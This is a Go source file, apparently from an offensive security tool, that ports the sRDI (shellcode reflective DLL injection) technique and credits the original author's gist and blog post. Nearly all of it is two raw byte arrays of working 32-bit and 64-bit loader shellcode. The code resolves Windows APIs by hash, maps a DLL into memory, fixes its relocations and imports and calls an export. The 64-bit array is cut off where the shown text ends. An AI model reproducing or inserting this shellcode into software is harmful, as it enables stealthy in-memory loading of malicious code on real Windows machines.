package generate

/*
	This is port of SRDI by Leo Loobeek, that we've made a few modifications to

	Originals:
	https://gist.github.com/leoloobeek/c726719d25d7e7953d4121bd93dd2ed3
	https://silentbreaksecurity.com/srdi-shellcode-reflective-dll-injection/
*/

// Moved shellcode to it's own file to de-clutter the source code

var (
	rdiShellcode32 = []byte{0x83, 0xEC, 0x48, 0x83, 0x64, 0x24, 0x18, 0x00, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0x53, 0x55, 0x56, 0x57, 0x33, 0xF6, 0xE8, 0x22, 0x04, 0x00, 0x00, 0xB9, 0x49, 0xF7, 0x02, 0x78, 0x89, 0x44, 0x24, 0x1C, 0xE8, 0x14, 0x04, 0x00, 0x00, 0xB9, 0x58, 0xA4, 0x53, 0xE5, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x06, 0x04, 0x00, 0x00, 0xB9, 0x10, 0xE1, 0x8A, 0xC3, 0x8B, 0xE8, 0xE8, 0xFA, 0x03, 0x00, 0x00, 0xB9, 0xAF, 0xB1, 0x5C, 0x94, 0x89, 0x44, 0x24, 0x2C, 0xE8, 0xEC, 0x03, 0x00, 0x00, 0xB9, 0x33, 0x00, 0x9E, 0x95, 0x89, 0x44, 0x24, 0x30, 0xE8, 0xDE, 0x03, 0x00, 0x00, 0x8B, 0xD8, 0x8B, 0x44, 0x24, 0x5C, 0x8B, 0x78, 0x3C, 0x03, 0xF8, 0x89, 0x7C, 0x24, 0x10, 0x81, 0x3F, 0x50, 0x45, 0x00, 0x00, 0x74, 0x07, 0x33, 0xC0, 0xE9, 0xB8, 0x03, 0x00, 0x00, 0xB8, 0x4C, 0x01, 0x00, 0x00, 0x66, 0x39, 0x47, 0x04, 0x75, 0xEE, 0xF6, 0x47, 0x38, 0x01, 0x75, 0xE8, 0x0F, 0xB7, 0x57, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x85, 0xD2, 0x74, 0x22, 0x8D, 0x4F, 0x24, 0x03, 0xC8, 0x83, 0x79, 0x04, 0x00, 0x8B, 0x01, 0x75, 0x05, 0x03, 0x47, 0x38, 0xEB, 0x03, 0x03, 0x41, 0x04, 0x3B, 0xC6, 0x0F, 0x47, 0xF0, 0x83, 0xC1, 0x28, 0x83, 0xEA, 0x01, 0x75, 0xE3, 0x8D, 0x44, 0x24, 0x34, 0x50, 0xFF, 0xD3, 0x8B, 0x44, 0x24, 0x38, 0x8B, 0x5F, 0x50, 0x8D, 0x50, 0xFF, 0x8D, 0x48, 0xFF, 0xF7, 0xD2, 0x48, 0x03, 0xCE, 0x03, 0xC3, 0x23, 0xCA, 0x23, 0xC2, 0x3B, 0xC1, 0x75, 0x97, 0x6A, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD5, 0x8B, 0x77, 0x54, 0x8B, 0xD8, 0x8B, 0x44, 0x24, 0x5C, 0x33, 0xC9, 0x89, 0x44, 0x24, 0x14, 0x8B, 0xD3, 0x33, 0xC0, 0x89, 0x5C, 0x24, 0x18, 0x40, 0x89, 0x44, 0x24, 0x24, 0x85, 0xF6, 0x74, 0x37, 0x8B, 0x6C, 0x24, 0x6C, 0x8B, 0x5C, 0x24, 0x14, 0x23, 0xE8, 0x4E, 0x85, 0xED, 0x74, 0x19, 0x8B, 0xC7, 0x2B, 0x44, 0x24, 0x5C, 0x3B, 0xC8, 0x73, 0x0F, 0x83, 0xF9, 0x3C, 0x72, 0x05, 0x83, 0xF9, 0x3E, 0x76, 0x05, 0xC6, 0x02, 0x00, 0xEB, 0x04, 0x8A, 0x03, 0x88, 0x02, 0x41, 0x43, 0x42, 0x85, 0xF6, 0x75, 0xD7, 0x8B, 0x5C, 0x24, 0x18, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x85, 0xC0, 0x74, 0x38, 0x83, 0xC7, 0x2C, 0x03, 0xCF, 0x8B, 0x7C, 0x24, 0x5C, 0x8B, 0x51, 0xF8, 0x48, 0x8B, 0x31, 0x03, 0xD3, 0x8B, 0x69, 0xFC, 0x03, 0xF7, 0x89, 0x44, 0x24, 0x5C, 0x85, 0xED, 0x74, 0x0F, 0x8A, 0x06, 0x88, 0x02, 0x42, 0x46, 0x83, 0xED, 0x01, 0x75, 0xF5, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC1, 0x28, 0x85, 0xC0, 0x75, 0xD5, 0x8B, 0x7C, 0x24, 0x10, 0x8B, 0xB7, 0x80, 0x00, 0x00, 0x00, 0x03, 0xF3, 0x89, 0x74, 0x24, 0x14, 0x8B, 0x46, 0x0C, 0x85, 0xC0, 0x74, 0x7D, 0x03, 0xC3, 0x50, 0xFF, 0x54, 0x24, 0x20, 0x8B, 0x6E, 0x10, 0x8B, 0xF8, 0x8B, 0x06, 0x03, 0xEB, 0x03, 0xC3, 0x89, 0x44, 0x24, 0x5C, 0x83, 0x7D, 0x00, 0x00, 0x74, 0x4F, 0x8B, 0x74, 0x24, 0x20, 0x8B, 0x08, 0x85, 0xC9, 0x74, 0x1E, 0x79, 0x1C, 0x8B, 0x47, 0x3C, 0x0F, 0xB7, 0xC9, 0x8B, 0x44, 0x38, 0x78, 0x2B, 0x4C, 0x38, 0x10, 0x8B, 0x44, 0x38, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x38, 0x03, 0xC7, 0xEB, 0x0C, 0x8B, 0x45, 0x00, 0x83, 0xC0, 0x02, 0x03, 0xC3, 0x50, 0x57, 0xFF, 0xD6, 0x89, 0x45, 0x00, 0x83, 0xC5, 0x04, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x5C, 0x83, 0x7D, 0x00, 0x00, 0x75, 0xB9, 0x8B, 0x74, 0x24, 0x14, 0x8B, 0x46, 0x20, 0x83, 0xC6, 0x14, 0x89, 0x74, 0x24, 0x14, 0x85, 0xC0, 0x75, 0x87, 0x8B, 0x7C, 0x24, 0x10, 0x8B, 0xEB, 0x2B, 0x6F, 0x34, 0x83, 0xBF, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xAA, 0x00, 0x00, 0x00, 0x8B, 0x97, 0xA0, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x89, 0x54, 0x24, 0x5C, 0x8D, 0x4A, 0x04, 0x8B, 0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x84, 0x8D, 0x00, 0x00, 0x00, 0x8B, 0x32, 0x8D, 0x78, 0xF8, 0x03, 0xF3, 0x8D, 0x42, 0x08, 0xD1, 0xEF, 0x89, 0x44, 0x24, 0x20, 0x74, 0x60, 0x6A, 0x02, 0x8B, 0xD8, 0x5A, 0x0F, 0xB7, 0x0B, 0x4F, 0x66, 0x8B, 0xC1, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x0A, 0x74, 0x06, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x0B, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x01, 0x2C, 0x31, 0xEB, 0x27, 0x66, 0x3B, 0x44, 0x24, 0x24, 0x75, 0x11, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x8B, 0xC5, 0xC1, 0xE8, 0x10, 0x66, 0x01, 0x04, 0x31, 0xEB, 0x0F, 0x66, 0x3B, 0xC2, 0x75, 0x0A, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x66, 0x01, 0x2C, 0x31, 0x03, 0xDA, 0x85, 0xFF, 0x75, 0xB1, 0x8B, 0x5C, 0x24, 0x18, 0x8B, 0x54, 0x24, 0x5C, 0x8B, 0x4C, 0x24, 0x14, 0x03, 0x11, 0x89, 0x54, 0x24, 0x5C, 0x8D, 0x4A, 0x04, 0x8B, 0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x85, 0x77, 0xFF, 0xFF, 0xFF, 0x8B, 0x7C, 0x24, 0x10, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x85, 0xC0, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x8B, 0x74, 0x24, 0x5C, 0x8D, 0x6F, 0x3C, 0x03, 0xE9, 0x48, 0x83, 0x7D, 0xEC, 0x00, 0x89, 0x44, 0x24, 0x24, 0x0F, 0x86, 0x94, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0x00, 0x33, 0xD2, 0x42, 0x8B, 0xC1, 0xC1, 0xE8, 0x1D, 0x23, 0xC2, 0x8B, 0xD1, 0xC1, 0xEA, 0x1E, 0x83, 0xE2, 0x01, 0xC1, 0xE9, 0x1F, 0x85, 0xC0, 0x75, 0x18, 0x85, 0xD2, 0x75, 0x07, 0x6A, 0x08, 0x5E, 0x6A, 0x01, 0xEB, 0x05, 0x6A, 0x04, 0x5E, 0x6A, 0x02, 0x85, 0xC9, 0x58, 0x0F, 0x44, 0xF0, 0xEB, 0x2C, 0x85, 0xD2, 0x75, 0x17, 0x85, 0xC9, 0x75, 0x04, 0x6A, 0x10, 0xEB, 0x15, 0x85, 0xD2, 0x75, 0x0B, 0x85, 0xC9, 0x74, 0x18, 0xBE, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x11, 0x85, 0xC9, 0x75, 0x05, 0x6A, 0x20, 0x5E, 0xEB, 0x08, 0x6A, 0x40, 0x85, 0xC9, 0x58, 0x0F, 0x45, 0xF0, 0x8B, 0x4D, 0x00, 0x8B, 0xC6, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x81, 0xE1, 0x00, 0x00, 0x00, 0x04, 0x0F, 0x44, 0xC6, 0x8B, 0xF0, 0x8D, 0x44, 0x24, 0x28, 0x50, 0x8B, 0x45, 0xE8, 0x56, 0xFF, 0x75, 0xEC, 0x03, 0xC3, 0x50, 0xFF, 0x54, 0x24, 0x3C, 0x85, 0xC0, 0x0F, 0x84, 0xEC, 0xFC, 0xFF, 0xFF, 0x8B, 0x44, 0x24, 0x24, 0x83, 0xC5, 0x28, 0x85, 0xC0, 0x0F, 0x85, 0x52, 0xFF, 0xFF, 0xFF, 0x8B, 0x77, 0x28, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0xFF, 0x03, 0xF3, 0xFF, 0x54, 0x24, 0x3C, 0x33, 0xC0, 0x40, 0x50, 0x50, 0x53, 0xFF, 0xD6, 0x83, 0x7C, 0x24, 0x60, 0x00, 0x74, 0x7C, 0x83, 0x7F, 0x7C, 0x00, 0x74, 0x76, 0x8B, 0x4F, 0x78, 0x03, 0xCB, 0x8B, 0x41, 0x18, 0x85, 0xC0, 0x74, 0x6A, 0x83, 0x79, 0x14, 0x00, 0x74, 0x64, 0x8B, 0x69, 0x20, 0x8B, 0x79, 0x24, 0x03, 0xEB, 0x83, 0x64, 0x24, 0x5C, 0x00, 0x03, 0xFB, 0x85, 0xC0, 0x74, 0x51, 0x8B, 0x75, 0x00, 0x03, 0xF3, 0x33, 0xD2, 0x0F, 0xBE, 0x06, 0xC1, 0xCA, 0x0D, 0x03, 0xD0, 0x46, 0x80, 0x7E, 0xFF, 0x00, 0x75, 0xF1, 0x39, 0x54, 0x24, 0x60, 0x74, 0x16, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC5, 0x04, 0x40, 0x83, 0xC7, 0x02, 0x89, 0x44, 0x24, 0x5C, 0x3B, 0x41, 0x18, 0x72, 0xD0, 0xEB, 0x1F, 0x0F, 0xB7, 0x17, 0x83, 0xFA, 0xFF, 0x74, 0x17, 0x8B, 0x41, 0x1C, 0xFF, 0x74, 0x24, 0x68, 0xFF, 0x74, 0x24, 0x68, 0x8D, 0x04, 0x90, 0x8B, 0x04, 0x18, 0x03, 0xC3, 0xFF, 0xD0, 0x59, 0x59, 0x8B, 0xC3, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x48, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44, 0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74, 0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04, 0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8, 0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B, 0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33, 0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF, 0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24, 0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56, 0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7, 0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB}
	rdiShellcode64 = []byte{0x48, 0x8B, 0xC4, 0x44, 0x89, 0x48, 0x20, 0x4C, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x78, 0x83, 0x60, 0x08, 0x00, 0x48, 0x8B, 0xE9, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0x44, 0x8B, 0xFA, 0x33, 0xDB, 0xE8, 0xA4, 0x04, 0x00, 0x00, 0xB9, 0x49, 0xF7, 0x02, 0x78, 0x4C, 0x8B, 0xE8, 0xE8, 0x97, 0x04, 0x00, 0x00, 0xB9, 0x58, 0xA4, 0x53, 0xE5, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x88, 0x04, 0x00, 0x00, 0xB9, 0x10, 0xE1, 0x8A, 0xC3, 0x48, 0x8B, 0xF0, 0xE8, 0x7B, 0x04, 0x00, 0x00, 0xB9, 0xAF, 0xB1, 0x5C, 0x94, 0x48, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x6C, 0x04, 0x00, 0x00, 0xB9, 0x33, 0x00, 0x9E, 0x95, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B, 0xE0, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x48, 0x63, 0x7D, 0x3C, 0x4C, 0x8B, 0xD0, 0x48, 0x03, 0xFD, 0x81, 0x3F, 0x50, 0x45, 0x00, 0x00, 0x74, 0x07, 0x33, 0xC0, 0xE9, 0x2D, 0x04, 0x00, 0x00, 0xB8, 0x64, 0x86, 0x00, 0x00, 0x66, 0x39, 0x47, 0x04, 0x75, 0xEE, 0x41, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x44, 0x84, 0x77, 0x38, 0x75, 0xE2, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x44, 0x8B, 0x4F, 0x38, 0x85, 0xC0, 0x74, 0x2C, 0x48, 0x8D, 0x57, 0x24, 0x44, 0x8B, 0xC0, 0x48, 0x03, 0xD1, 0x8B, 0x4A, 0x04, 0x85, 0xC9, 0x75, 0x07, 0x8B, 0x02, 0x49, 0x03, 0xC1, 0xEB, 0x04, 0x8B, 0x02, 0x03, 0xC1, 0x48, 0x3B, 0xC3, 0x48, 0x0F, 0x47, 0xD8, 0x48, 0x83, 0xC2, 0x28, 0x4D, 0x2B, 0xC6, 0x75, 0xDE, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xFF, 0xD2, 0x44, 0x8B, 0x44, 0x24, 0x3C, 0x44, 0x8B, 0x4F, 0x50, 0x41, 0x8D, 0x40, 0xFF, 0xF7, 0xD0, 0x41, 0x8D, 0x50, 0xFF, 0x41, 0x03, 0xD1, 0x49, 0x8D, 0x48, 0xFF, 0x48, 0x23, 0xD0, 0x48, 0x03, 0xCB, 0x49, 0x8D, 0x40, 0xFF, 0x48, 0xF7, 0xD0, 0x48, 0x23, 0xC8, 0x48, 0x3B, 0xD1, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC9, 0x41, 0x8B, 0xD1, 0x41, 0xB8, 0x00, 0x30, 0x00, 0x00, 0x44, 0x8D, 0x49, 0x04, 0xFF, 0xD6, 0x44, 0x8B, 0x47, 0x54, 0x33, 0xD2, 0x48, 0x8B, 0xF0, 0x4C, 0x8B, 0xD5, 0x48, 0x8B, 0xC8, 0x44, 0x8D, 0x5A, 0x02, 0x4D, 0x85, 0xC0, 0x74, 0x3F, 0x44, 0x8B, 0x8C, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x45, 0x23, 0xCE, 0x4D, 0x2B, 0xC6, 0x45, 0x85, 0xC9, 0x74, 0x19, 0x48, 0x8B, 0xC7, 0x48, 0x2B, 0xC5, 0x48, 0x3B, 0xD0, 0x73, 0x0E, 0x48, 0x8D, 0x42, 0xC4, 0x49, 0x3B, 0xC3, 0x76, 0x05, 0xC6, 0x01, 0x00, 0xEB, 0x05, 0x41, 0x8A, 0x02, 0x88, 0x01, 0x49, 0x03, 0xD6, 0x4D, 0x03, 0xD6, 0x49, 0x03, 0xCE, 0x4D, 0x85, 0xC0, 0x75, 0xCC, 0x44, 0x0F, 0xB7, 0x57, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x4D, 0x85, 0xD2, 0x74, 0x38, 0x48, 0x8D, 0x4F, 0x2C, 0x48, 0x03, 0xC8, 0x8B, 0x51, 0xF8, 0x4D, 0x2B, 0xD6, 0x44, 0x8B, 0x01, 0x48, 0x03, 0xD6, 0x44, 0x8B, 0x49, 0xFC, 0x4C, 0x03, 0xC5, 0x4D, 0x85, 0xC9, 0x74, 0x10, 0x41, 0x8A, 0x00, 0x4D, 0x03, 0xC6, 0x88, 0x02, 0x49, 0x03, 0xD6, 0x4D, 0x2B, 0xCE, 0x75, 0xF0, 0x48, 0x83, 0xC1, 0x28, 0x4D, 0x85, 0xD2, 0x75, 0xCF, 0x8B, 0x9F, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xDE, 0x8B, 0x43, 0x0C, 0x85, 0xC0, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x6C, 0x24, 0x20, 0x8B, 0xC8, 0x48, 0x03, 0xCE, 0x41, 0xFF, 0xD5, 0x44, 0x8B, 0x3B, 0x4C, 0x8B, 0xE0, 0x44, 0x8B, 0x73, 0x10, 0x4C, 0x03, 0xFE, 0x4C, 0x03, 0xF6, 0xEB, 0x49, 0x49, 0x83, 0x3F, 0x00, 0x7D, 0x29, 0x49, 0x63, 0x44, 0x24, 0x3C, 0x41, 0x0F, 0xB7, 0x17, 0x42, 0x8B, 0x8C, 0x20, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8B, 0x44, 0x21, 0x10, 0x42, 0x8B, 0x4C, 0x21, 0x1C, 0x48, 0x2B, 0xD0, 0x49, 0x03, 0xCC, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC4, 0xEB, 0x0F, 0x49, 0x8B, 0x16, 0x49, 0x8B, 0xCC, 0x48, 0x83, 0xC2, 0x02, 0x48, 0x03, 0xD6, 0xFF, 0xD5, 0x49, 0x89, 0x06, 0x49, 0x83, 0xC6, 0x08, 0x49, 0x83, 0xC7, 0x08, 0x49, 0x83, 0x3E, 0x00, 0x75, 0xB1, 0x8B, 0x43, 0x20, 0x48, 0x83, 0xC3, 0x14, 0x85, 0xC0, 0x75, 0x8C, 0x44, 0x8B, 0xBC, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x70, 0x01, 0x4C, 0x8B, 0x64, 0x24, 0x28, 0x4C, 0x8B, 0xCE, 0x41, 0xBD, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x2B, 0x4F, 0x30, 0x83, 0xBF, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x95, 0x00, 0x00, 0x00, 0x8B, 0x97, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x03, 0xD6, 0x8B, 0x42, 0x04, 0x85, 0xC0, 0x0F, 0x84, 0x81, 0x00, 0x00, 0x00, 0xBB, 0xFF, 0x0F, 0x00, 0x00, 0x44, 0x8B, 0x02, 0x4C, 0x8D, 0x5A, 0x08, 0x44, 0x8B, 0xD0, 0x4C, 0x03, 0xC6, 0x49, 0x83, 0xEA, 0x08, 0x49, 0xD1, 0xEA, 0x74, 0x59, 0x41, 0x0F, 0xB7, 0x0B, 0x4D, 0x2B, 0xD6, 0x0F, 0xB7, 0xC1, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x0A, 0x75, 0x09, 0x48, 0x23, 0xCB, 0x4E, 0x01, 0x0C, 0x01, 0xEB, 0x34, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x09, 0x48, 0x23, 0xCB, 0x46, 0x01, 0x0C, 0x01, 0xEB, 0x25, 0x66, 0x41, 0x3B, 0xC6, 0x75, 0x11, 0x48, 0x23, 0xCB, 0x49, 0x8B, 0xC1, 0x48, 0xC1, 0xE8, 0x10, 0x66, 0x42, 0x01, 0x04, 0x01, 0xEB, 0x0E, 0x66, 0x41, 0x3B, 0xC5, 0x75, 0x08, 0x48, 0x23, 0xCB, 0x66, 0x46, 0x01, 0x0C, 0x01, 0x4D, 0x03, 0xDD, 0x4D, 0x85, 0xD2, 0x75, 0xA7, 0x8B, 0x42, 0x04, 0x48, 0x03, 0xD0, 0x8B, 0x42, 0x04, 0x85, 0xC0, 0x75, 0x84, 0x0F, 0xB7, 0x6F, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x48, 0x85, 0xED, 0x0F, 0x84, 0xCF, 0x00, 0x00, 0x00, 0x8B, 0x9C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x77, 0x3C, 0x4C, 0x8B, 0x6C, 0x24, 0x30, 0x4C, 0x03, 0xF0, 0x48, 0xFF, 0xCD, 0x41, 0x83, 0x7E, 0xEC, 0x00, 0x0F, 0x86, 0x9D, 0x00, 0x00, 0x00, 0x45, 0x8B, 0x06, 0x41, 0x8B, 0xD0, 0xC1, 0xEA, 0x1E, 0x41, 0x8B, 0xC0, 0x41, 0x8B, 0xC8, 0xC1, 0xE8, 0x1D, 0x83, 0xE2, 0x01, 0xC1, 0xE9, 0x1F, 0x83, 0xE0, 0x01, 0x75, 0x1E, 0x85, 0xD2, 0x75, 0x0B, 0xF7, 0xD9, 0x1B, 0xDB, 0x83, 0xE3, 0x07, 0xFF, 0xC3, 0xEB, 0x3E, 0xF7, 0xD9, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x1B, 0xDB, 0x23, 0xD8, 0x03, 0xD8, 0xEB, 0x2F, 0x85, 0xD2, 0x75, 0x18, 0x85, 0xC9, 0x75, 0x05, 0x8D, 0x5A, 0x10, 0xEB, 0x22, 0x85, 0xD2, 0x75, 0x0B, 0x85, 0xC9, 0x74, 0x1A, 0xBB, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x13, 0x85, 0xC9, 0x75, 0x05, 0x8D, 0x59, 0x20, 0xEB, 0x0A, 0x85, 0xC9, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x0F, 0x45, 0xD8, 0x41, 0x8B, 0x4E, 0xE8, 0x4C, 0x8D, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x56, 0xEC, 0x8B, 0xC3, 0x0F, 0xBA, 0xE8, 0x09, 0x41, 0x81, 0xE0, 0x00, 0x00, 0x00, 0x04, 0x0F, 0x44, 0xC3, 0x48, 0x03, 0xCE, 0x44, 0x8B, 0xC0, 0x8B, 0xD8, 0x41, 0xFF, 0xD5, 0x85, 0xC0, 0x0F, 0x84, 0xA1, 0xFC, 0xFF, 0xFF, 0x49, 0x83, 0xC6, 0x28, 0x48, 0x85, 0xED, 0x0F, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x44, 0x8D, 0x6D, 0x02, 0x8B, 0x5F, 0x28, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x83, 0xC9, 0xFF, 0x48, 0x03, 0xDE, 0x41, 0xFF, 0xD4, 0xBD, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0x44, 0x8B, 0xC5, 0x8B, 0xD5, 0xFF, 0xD3, 0x45, 0x85, 0xFF, 0x0F, 0x84, 0x97, 0x00, 0x00, 0x00, 0x83, 0xBF, 0x8C, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x97, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xD6, 0x44, 0x8B, 0x5A, 0x18, 0x45, 0x85, 0xDB, 0x74, 0x78, 0x83, 0x7A, 0x14, 0x00, 0x74, 0x72, 0x44, 0x8B, 0x52, 0x20, 0x33, 0xDB, 0x44, 0x8B, 0x4A, 0x24, 0x4C, 0x03, 0xD6, 0x4C, 0x03, 0xCE, 0x45, 0x85, 0xDB, 0x74, 0x5D, 0x45, 0x8B, 0x02, 0x4C, 0x03, 0xC6, 0x33, 0xC9, 0x41, 0x0F, 0xBE, 0x00, 0x4C, 0x03, 0xC5, 0xC1, 0xC9, 0x0D, 0x03, 0xC8, 0x41, 0x80, 0x78, 0xFF, 0x00, 0x75, 0xED, 0x44, 0x3B, 0xF9, 0x74, 0x10, 0x03, 0xDD, 0x49, 0x83, 0xC2, 0x04, 0x4D, 0x03, 0xCD, 0x41, 0x3B, 0xDB, 0x72, 0xD2, 0xEB, 0x2D, 0x41, 0x0F, 0xB7, 0x01, 0x83, 0xF8, 0xFF, 0x74, 0x24, 0x8B, 0x52, 0x1C, 0x48, 0x8B, 0x8C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0xC1, 0xE0, 0x02, 0x48, 0x98, 0x48, 0x03, 0xC6, 0x44, 0x8B, 0x04, 0x02, 0x8B, 0x94, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xC6, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0xC6, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8B, 0xF1, 0x48, 0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x4A, 0x10, 0x4D, 0x8B, 0x41, 0x30, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xB4, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3C, 0x33, 0xD2, 0x4D, 0x8B, 0x09, 0xF3, 0x0F, 0x7F, 0x04, 0x24, 0x42, 0x8B, 0x9C, 0x00, 0x88, 0x00, 0x00, 0x00, 0x85, 0xDB, 0x74, 0xD4, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x44, 0x0F, 0xB7, 0xD0, 0x45, 0x85, 0xD2, 0x74, 0x21, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x45, 0x8B, 0xDA, 0x0F, 0xBE, 0x01, 0xC1, 0xCA, 0x0D, 0x80, 0x39, 0x61, 0x7C, 0x03, 0x83, 0xC2, 0xE0, 0x03, 0xD0, 0x48, 0xFF, 0xC1, 0x49, 0x83, 0xEB, 0x01, 0x75, 0xE7, 0x4D, 0x8D, 0x14, 0x18, 0x33, 0xC9, 0x41, 0x8B, 0x7A, 0x20, 0x49, 0x03, 0xF8, 0x41, 0x39, 0x4A, 0x18, 0x76, 0x8F, 0x8B, 0x1F, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD8, 0x48, 0x8D, 0x7F, 0x04, 0x0F, 0xBE, 0x03, 0x48, 0xFF, 0xC3, 0x41, 0xC1, 0xCB, 0x0D, 0x44, 0x03, 0xD8, 0x80, 0x7B, 0xFF, 0x00, 0x75, 0xED, 0x41, 0x8D, 0x04, 0x13, 0x3B, 0xC6, 0x74, 